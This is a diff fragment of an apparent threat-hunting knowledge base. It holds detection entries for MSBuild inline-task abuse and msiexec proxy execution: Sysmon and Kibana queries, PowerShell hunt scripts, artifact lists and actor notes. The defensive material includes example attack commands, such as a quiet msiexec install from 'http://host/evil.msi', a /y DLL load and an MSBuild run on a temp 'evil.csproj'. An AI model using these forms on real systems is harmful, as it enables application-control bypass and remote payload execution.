+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === MSBuild spawning shells / rundll32 (post-exec) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'ParentImage:.*MSBuild\\.exe' -and $_.Message -match 'Image:.*(cmd|powershell|rundll32)\\.exe' } |
+  Select-Object TimeCreated, @{n='Child';e={(Split-Path ([regex]::Match($_.Message,'Image: (.+)')).Groups[1].Value -Leaf)}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === MSBuild network connections (inline payload beaconing) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=3} -MaxEvents 1000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'MSBuild\\.exe' } |
+  Select-Object TimeCreated, @{n='Dest';e={([regex]::Match($_.Message,'DestinationIp: (.+)')).Groups[1].Value}} -First 15 | Format-Table -Auto
+
+Write-Host "[*] === scan recent project files for inline-task source ==="
+Get-ChildItem 'C:\\Users\\*\\AppData\\*','C:\\Windows\\Temp','C:\\ProgramData' -Include *.csproj,*.xml,*.proj -Recurse -ErrorAction SilentlyContinue |
+  Select-String -Pattern 'UsingTask|Code Type=|Language="cs"|System.Reflection|FromBase64String' -List -ErrorAction SilentlyContinue |
+  Select-Object Path -First 15 | Format-Table -Auto`,
+        registry: `MSBuild inline-task execution artifacts:
+
+The binary (.NET framework + Visual Studio locations):
+  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe
+  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe
+  C:\\Program Files*\\Microsoft Visual Studio\\...\\MSBuild\\...\\MSBuild.exe
+
+The abuse (inline task):
+  a project file (.csproj / .xml / .proj) contains an inline build
+  task with embedded source, e.g. a <UsingTask> with a <Task><Code
+  Type="Class" Language="cs"> block. When MSBuild builds the project,
+  it COMPILES that C# in-process (via Roslyn/csc) and runs it. So:
+    MSBuild.exe C:\\Users\\...\\AppData\\Local\\Temp\\evil.csproj
+  performs on-host compilation + execution under a signed binary,
+  with no standalone compiler invocation and no precompiled payload
+  on disk to scan.
+
+Two evasions in one:
+  - application-control bypass: MSBuild is a signed, trusted
+    developer tool, frequently allow-listed.
+  - static-detection evasion: the payload exists as C# SOURCE inside
+    a project file and is compiled only at runtime, so signature
+    scanning of executables finds nothing.
+
+The discriminator is CONTEXT, not the binary:
+  MSBuild legitimately runs under Visual Studio, dotnet, and CI/build
+  agents, building projects in dev/repo/build directories. The abuse
+  runs MSBuild from a user temp path, parented by Office/script/shell,
+  often followed by a child shell or network beacon. That contextual
+  mismatch is the detection.
+
+Content tell (for the inline task):
+  project files containing UsingTask + Code + Language="cs" together
+  with reflection / FromBase64String / process-start APIs are
+  strongly suspect; scan user-writable project files for that combo.
+
+High-signal indicators:
+  MSBuild building a project from Temp/AppData/Downloads
+  MSBuild with an Office/script/shell parent (no dev IDE/CI parent)
+  MSBuild spawning cmd/powershell/rundll32, or network egress
+  csc.exe/Roslyn loaded by MSBuild at runtime (inline compilation)
+
+Reference:
+  LOLBAS /lolbas/Binaries/Msbuild/ documents the inline-task abuse.`,
+        tools: `MSBuild as a trusted developer-utility executor:
+
+MSBuild is the build engine behind Visual Studio and dotnet, and it
+will happily compile and run inline C# embedded in a project file.
+That makes it a uniquely capable LOLBin: it bypasses application
+control as a signed developer tool AND defeats static detection by
+shipping the payload as SOURCE that is compiled only at runtime. No
+separate compiler, no precompiled binary on disk.
+
+Why you hunt context, not the binary:
+  MSBuild runs constantly and legitimately on developer machines and
+  build servers - you cannot simply alert on its execution. The
+  discriminator is where and how it runs. Legitimate MSBuild has a
+  developer-IDE or CI parent and builds projects in source/build
+  directories. Malicious MSBuild is launched from a user temp folder,
+  parented by Office, a script host, or a shell, and frequently
+  spawns a shell or beacons out afterward. That contextual profile -
+  trusted dev tool in an untrusted context - is the signal.
+
+The content angle:
+  because the payload is C# source in a .csproj/.xml, you can also
+  hunt the files: an inline UsingTask + Code block in Language="cs",
+  especially alongside reflection, base64 decoding, or process-start
+  calls, in a user-writable directory, is a strong static tell that
+  complements the runtime behavior.
+
+Family view:
+  MSBuild sits with InstallUtil, RegAsm, and RegSvcs as managed-code
+  LOLBins that proxy through trusted .NET tooling. The shared lesson
+  for allow-listing: do not blanket-trust the .NET framework and
+  Visual Studio directories, because several of their binaries are
+  arbitrary-code executors by design.
+
+OT/ICS relevance:
+  on a non-developer Windows host (most HMIs and engineering
+  workstations), MSBuild has essentially no legitimate runtime, so
+  its execution there - especially from a user path - is a strong
+  standalone signal and a candidate for outright application-control
+  denial.
+
+Threat actor use:
+  a well-known red-team and APT bypass; used by espionage operators
+  (including Russian sets) and criminal crews to run .NET tradecraft
+  and Cobalt Strike stagers through a signed build tool.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_msbuild_susp_path_project.yml
+- proc_creation_win_msbuild_nondev_parent.yml
+- proc_creation_win_msbuild_spawn_shell.yml
+- file_event_win_msbuild_inline_task_project.yml (UsingTask/Code content)
+
+Elastic detection rules:
+- MSBuild Building Project from User Path
+- MSBuild Spawned by Office/Script/Shell
+- MSBuild Network Connection (Inline Payload Beacon)
+
+Detection pattern:
+  trusted dev tool (MSBuild) in an untrusted context - user-path
+  project, non-dev parent, child shell, or network egress; plus the
+  content tell (UsingTask + inline cs Code) in user-writable
+  project files.
+
+LOLBAS:
+  /lolbas/Binaries/Msbuild/ - inline-task abuse and baseline.
+
+Sysmon config:
+  EID 1 (command line + parent/child), 7 (csc/Roslyn/clr load =
+  runtime compilation), 3 (network), 11 (transient build artifacts).
+
+Application control:
+  WDAC managed-code enforcement; do NOT blanket-trust the .NET
+  framework / Visual Studio paths; deny MSBuild on non-developer
+  hosts via app control.
+
+osquery / file scan:
+  SELECT pid,name,cmdline,parent FROM processes WHERE name='MSBuild.exe';
+  grep user-path .csproj/.xml for UsingTask + Code Language="cs".
+
+Atomic Red Team:
+  T1127.001 - MSBuild inline task execution tests`,
+        notes: "MSBuild is the build engine behind Visual Studio and dotnet, and it will happily compile and run inline C# embedded in a project file, which makes it a uniquely capable LOLBin because it bypasses application control as a signed developer tool and also defeats static detection by shipping the payload as source that is compiled only at runtime, with no separate compiler and no precompiled binary on disk. You hunt context rather than the binary because MSBuild runs constantly and legitimately on developer machines and build servers, so you cannot simply alert on its execution; the discriminator is where and how it runs, since legitimate MSBuild has a developer-IDE or CI parent and builds projects in source or build directories, whereas malicious MSBuild is launched from a user temp folder, parented by Office, a script host, or a shell, and frequently spawns a shell or beacons out afterward, making that profile of a trusted dev tool in an untrusted context the signal. Because the payload is C# source in a .csproj or .xml, you can also hunt the files, since an inline UsingTask plus Code block in Language cs, especially alongside reflection, base64 decoding, or process-start calls in a user-writable directory, is a strong static tell that complements the runtime behavior. MSBuild sits with InstallUtil, RegAsm, and RegSvcs as managed-code LOLBins that proxy through trusted .NET tooling, and the shared lesson for allow-listing is not to blanket-trust the .NET framework and Visual Studio directories because several of their binaries are arbitrary-code executors by design. On a non-developer Windows host such as most HMIs and engineering workstations, MSBuild has essentially no legitimate runtime, so its execution there, especially from a user path, is a strong standalone signal and a candidate for outright application-control denial. It is a well-known red-team and APT bypass, used by espionage operators including Russian sets and by criminal crews to run .NET tradecraft and Cobalt Strike stagers through a signed build tool. It is classified under T1127 Trusted Developer Utilities rather than T1218, but operationally it is a core LOLBin.",
+        apt: [
+          { cls: "apt-ru", name: "Russian espionage sets", note: "Use MSBuild inline-task compilation to run .NET tradecraft under a signed build tool, bypassing application control and static detection." },
+          { cls: "apt-mul", name: "Red-team / app-control bypass", note: "MSBuild compiling inline C# from a project file is a standard managed-code execution bypass for trusted-path allow-listing." },
+          { cls: "apt-mul", name: "Cobalt Strike stagers", note: "Inline-task MSBuild projects compile and launch beacon stagers on-host without a precompiled payload to scan." }
+        ],
+        cite: "MITRE ATT&CK T1127.001"
+      }
+    ]
+  },
+  {
+    id: "T1218.007",
+    name: "System Binary Proxy Execution: Msiexec",
+    desc: "Abusing msiexec.exe to install a malicious or remote MSI (msiexec /q /i http://host/evil.msi) or load a DLL via custom actions, running payloads under the signed Windows Installer. Because msiexec is extremely noisy with legitimate installs, detection scopes to the abusive properties: a remote http source with msiexec network egress, a maldoc or script parent, and msiexec spawning a shell.",
+    rows: [
+      {
+        sub: "T1218.007 - Msiexec: Remote and Malicious MSI Proxy Execution",
+        os: "win",
+        indicator: "Abusing msiexec.exe to install a malicious or remote MSI (msiexec /q /i http://host/evil.msi) or to load a malicious DLL through a custom action or the /y switch, executing payloads under the signed Windows Installer and bypassing application control that trusts msiexec",
+        sysmon: `// Process create (Sysmon EID 1) - msiexec abuse
+Image=*\\msiexec.exe CommandLine=(
+  // remote MSI fetch + quiet install (the signature)
+  (*\\/i* AND (*http* OR *https* OR *ftp*))
+  OR *\\/q* OR *\\/quiet*                 // silent install
+  OR *\\/y*                              // load a DLL (DllRegisterServer)
+  OR CommandLine=(*\\Temp\\* OR *\\AppData\\* OR *\\Downloads\\*))  // MSI from user path
+// msiexec with an Office/script parent, or spawning a shell
+ParentImage=(*\\winword.exe OR *\\outlook.exe OR *\\mshta.exe OR *\\powershell.exe)
+  AND Image=*\\msiexec.exe
+ParentImage=*\\msiexec.exe AND Image=(*\\cmd.exe OR *\\powershell.exe OR *\\rundll32.exe)
+
+// Network (EID 3): msiexec fetching a remote MSI over http/s
+// DNS (EID 22): msiexec resolving an external host
+// Image load (EID 7): a custom-action DLL loaded by msiexec
+// File create (EID 11): MSI cached to C:\\Windows\\Installer; dropped payloads
+// NOTE: msiexec runs constantly for legitimate installs - the remote
+//   URL and the Office/script parent are what separate abuse.`,
+        kibana: `// remote MSI install (the signature pattern)
+process.name: "msiexec.exe" AND process.command_line: (
+  (*"/i"* AND (*http* OR *https* OR *ftp*)) OR *"/y"*
+  OR ((*\\\\Temp\\\\* OR *\\\\AppData\\\\* OR *\\\\Downloads\\\\*) AND *.msi*))
+
+// msiexec with Office/script parent (delivery chain) or spawning shell
+(process.name: "msiexec.exe" AND process.parent.name: ("winword.exe"
+  OR "outlook.exe" OR "mshta.exe" OR "powershell.exe"))
+OR (process.parent.name: "msiexec.exe" AND process.name: ("cmd.exe"
+  OR "powershell.exe" OR "rundll32.exe"))
+
+// msiexec fetching a remote MSI (Sysmon 3) - the high-signal tell
+winlog.event_id: 3 AND process.name: "msiexec.exe"
+AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16)`,
+        powershell: `# T1218.007 - Msiexec proxy execution hunt
+# msiexec runs legitimately a LOT, so lead with the rare/abusive
+# signatures: a remote (http) MSI and msiexec network egress.
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+
+Write-Host "[*] === msiexec remote/abusive command lines (EID 1) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'msiexec\\.exe' -and $_.Message -match '/i.*http|/y\\b|(Temp|AppData|Downloads)\\\\.*\\.msi' } |
+  ForEach-Object {
+    $cl=([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $pp=([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value
+    [pscustomobject]@{Time=$_.TimeCreated; Parent=(Split-Path $pp -Leaf); Cmd=$cl}
+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === msiexec network connections (remote MSI fetch) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=3} -MaxEvents 1000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'msiexec\\.exe' -and $_.Message -notmatch 'DestinationIp: (10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.|127\\.)' } |
+  Select-Object TimeCreated, @{n='Dest';e={([regex]::Match($_.Message,'DestinationIp: (.+)')).Groups[1].Value}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === msiexec with Office/script parent or spawning a shell ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { ($_.Message -match 'ParentImage:.*(winword|outlook|mshta|powershell)' -and $_.Message -match 'Image:.*msiexec') -or ($_.Message -match 'ParentImage:.*msiexec' -and $_.Message -match 'Image:.*(cmd|powershell|rundll32)\\.exe') } |
+  Select-Object TimeCreated, @{n='Chain';e={(Split-Path ([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value -Leaf)+' -> '+(Split-Path ([regex]::Match($_.Message,'Image: (.+)')).Groups[1].Value -Leaf)}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === recently written MSI files in user-writable paths ==="
+Get-ChildItem 'C:\\Users\\*\\AppData\\*','C:\\Windows\\Temp','C:\\ProgramData' -Filter *.msi -Recurse -ErrorAction SilentlyContinue |
+  Select-Object FullName, LastWriteTime -First 15 | Format-Table -Auto`,
+        registry: `Msiexec proxy execution artifacts:
+
+The binary:
+  C:\\Windows\\System32\\msiexec.exe
+  C:\\Windows\\SysWOW64\\msiexec.exe
+
+Abuse forms:
+  remote MSI install:
+    msiexec /q /i http://host/evil.msi      (quiet + remote fetch)
+  local malicious MSI from a user path:
+    msiexec /q /i C:\\Users\\...\\AppData\\...\\evil.msi
+  DLL load via /y:
+    msiexec /y maliciousdll                 (calls DllRegisterServer)
+  malicious MSI custom actions / transforms run EXE or DLL payloads
+  during install, under the signed Windows Installer service.
+
+The detection challenge (and the answer):
+  msiexec runs constantly for legitimate software installs, so you
+  CANNOT simply alert on it. The discriminators are:
+    1. a REMOTE source: /i with an http(s)/ftp URL, and msiexec
+       making an outbound connection (Sysmon EID 3) to fetch it -
+       legitimate installs usually run a LOCAL .msi.
+    2. an Office/script-host PARENT (Outlook/Word/mshta/powershell ->
+       msiexec) indicating a delivery chain.
+    3. msiexec SPAWNING a shell or rundll32 (a custom action running
+       a payload).
+    4. the MSI residing in a user temp/download path.
+
+Artifacts on disk + registry:
+  cached MSI: C:\\Windows\\Installer\\*.msi
+  installed product keys:
+    HKLM\\SOFTWARE\\Classes\\Installer\\Products
+    HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
+  a newly written .msi in Temp/AppData/Downloads
+  MsiInstaller events in the Application log (1033/1040/11707 etc.)
+  correlate a new product install with a remote fetch.
+
+Reference:
+  LOLBAS /lolbas/Binaries/Msiexec/ documents the abuse forms.`,
+        tools: `Msiexec as a proxy executor:
+
+Msiexec is the Windows Installer, and it is trusted to do exactly
+what installers do: fetch a package, run its custom actions, drop and
+register files. Attackers ride that trust by packaging a payload as
+an MSI - often hosted remotely - and letting the signed installer
+execute it. It is a favored delivery LOLBin because MSI is a normal,
+expected install format that application control and users alike wave
+through.
+
+The detection problem, and how to scope it:
+  msiexec is one of the noisiest legitimate binaries on Windows, so a
+  bare "msiexec ran" rule is useless. The trick is to alert only on
+  the properties that legitimate local installs do not share:
+    - a remote source (/i http(s)) and msiexec network egress to
+      fetch it - this is the single best discriminator, since most
+      sanctioned installs run a local file from a managed share.
+    - a maldoc/script parent (Outlook/Word/mshta/powershell ->
+      msiexec), which is the delivery chain.
+    - msiexec spawning a shell or rundll32, which is a payload custom
+      action rather than a normal install.
+  Any one of these lifts msiexec out of the install noise.
+
+Corroborating with install telemetry:
+  MsiInstaller events in the Application log record product installs;
+  correlating a fresh install with a remote fetch and an unusual
+  parent confirms the abuse and gives you the product/package name
+  and the cached MSI in C:\\Windows\\Installer for analysis.
+
+Family note:
+  msiexec joins the broader proxy-execution set (rundll32, regsvr32,
+  mshta) where the binary is trusted and the abuse is in source,
+  arguments, parentage, and egress. The recurring control is the
+  same: signature/path allow-listing does nothing; behavior and
+  command-line context do the work.
+
+OT/ICS relevance:
+  software installs on OT hosts are typically rare, controlled, and
+  from known local media, so a remote-MSI msiexec or an msiexec with
+  a script parent is especially anomalous against a tight OT change
+  baseline.
+
+Threat actor use:
+  MSI-based delivery is widespread - North Korean (Lazarus) and
+  criminal (FIN7) operators, many commodity loaders, and numerous
+  ransomware precursors distribute payloads as MSIs run through
+  msiexec, frequently fetched from a remote URL.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_msiexec_remote_url.yml (/i + http)
+- net_connection_win_msiexec_network.yml
+- proc_creation_win_msiexec_susp_parent_child.yml
+- proc_creation_win_msiexec_dll_via_y.yml
+
+Elastic detection rules:
+- Msiexec Installing Remote MSI
+- Msiexec Network Connection
+- Msiexec Spawned by Office/Script or Spawning Shell
+
+The lead discriminators (against msiexec install noise):
+  remote /i http(s) source + Sysmon EID 3 network egress;
+  Office/script parent; msiexec spawning cmd/powershell/rundll32.
+
+Correlate with install telemetry:
+  Application-log MsiInstaller events (1033/1040/11707) for a fresh
+  product install matching a remote fetch; cached MSI in
+  C:\\Windows\\Installer for analysis.
+
+LOLBAS:
+  /lolbas/Binaries/Msiexec/ - remote install and /y DLL abuse forms.
+
+Sysmon config:
+  EID 1 (command line + parent/child), 3 (network - key), 22 (DNS),
+  7 (custom-action DLL load), 11 (MSI/payload file create).
+
+Application control:
+  constrain remote MSI installs; WDAC/AppLocker policies and
+  controlled software-deployment channels reduce the attack surface.
+
+osquery:
+  SELECT pid,name,cmdline,parent FROM processes WHERE name='msiexec.exe';
+  SELECT name,version,install_source FROM programs ORDER BY install_date DESC;
+
+Atomic Red Team:
+  T1218.007 - msiexec remote MSI and DLL execution tests`,
+        notes: "Msiexec is the Windows Installer, trusted to do exactly what installers do (fetch a package, run its custom actions, drop and register files), and attackers ride that trust by packaging a payload as an MSI, often hosted remotely, and letting the signed installer execute it, which makes it a favored delivery LOLBin because MSI is a normal expected install format that application control and users alike wave through. The detection problem is that msiexec is one of the noisiest legitimate binaries on Windows, so a bare msiexec-ran rule is useless, and the trick is to alert only on properties that legitimate local installs do not share: a remote source (/i http) plus msiexec network egress to fetch it, which is the single best discriminator since most sanctioned installs run a local file from a managed share; a maldoc or script parent such as Outlook, Word, mshta, or powershell spawning msiexec, which is the delivery chain; and msiexec spawning a shell or rundll32, which is a payload custom action rather than a normal install. Any one of these lifts msiexec out of the install noise. Corroborating with install telemetry helps, since MsiInstaller events in the Application log record product installs and correlating a fresh install with a remote fetch and an unusual parent confirms the abuse while giving the product or package name and the cached MSI in C:\\Windows\\Installer for analysis. Msiexec joins the broader proxy-execution set with rundll32, regsvr32, and mshta where the binary is trusted and the abuse is in source, arguments, parentage, and egress, and the recurring control is the same: signature and path allow-listing does nothing while behavior and command-line context do the work. Software installs on OT hosts are typically rare, controlled, and from known local media, so a remote-MSI msiexec or an msiexec with a script parent is especially anomalous against a tight OT change baseline. MSI-based delivery is widespread, used by North Korean Lazarus and criminal FIN7 operators, many commodity loaders, and numerous ransomware precursors that distribute payloads as MSIs run through msiexec and frequently fetched from a remote URL.",
+        apt: [
+          { cls: "apt-kp", name: "Lazarus", note: "Distributes payloads as MSI packages executed via msiexec, including remotely fetched installers, under the signed Windows Installer." },
+          { cls: "apt-mul", name: "FIN7 / criminal crews", note: "Use malicious MSI delivery with custom actions to run loaders through msiexec as an application-control bypass." },
+          { cls: "apt-mul", name: "Commodity loaders / ransomware precursors", note: "Remote MSI installs (msiexec /q /i http) are a common delivery and execution mechanism for first-stage payloads." }
+        ],
+        cite: "MITRE ATT&CK T1218.007"
       }
     ]
   },
